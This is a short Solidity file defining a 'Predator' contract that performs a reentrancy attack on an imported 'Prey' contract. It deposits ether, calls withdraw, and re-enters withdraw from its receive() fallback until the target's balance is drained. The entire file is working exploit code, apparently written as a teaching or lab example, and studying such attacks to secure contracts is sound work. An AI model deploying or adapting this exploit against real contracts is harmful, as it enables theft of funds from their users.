// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Prey.sol";

contract Predator {
    Prey public prey;
    constructor(address _prey) {
        prey = Prey(_prey);
    }

    receive() external payable {
        if(address(prey).balance > 0) {
            prey.withdraw();
        }
    }

    function attack() public payable {
        prey.updateBalance{value: msg.value}();
        prey.withdraw();
    }
}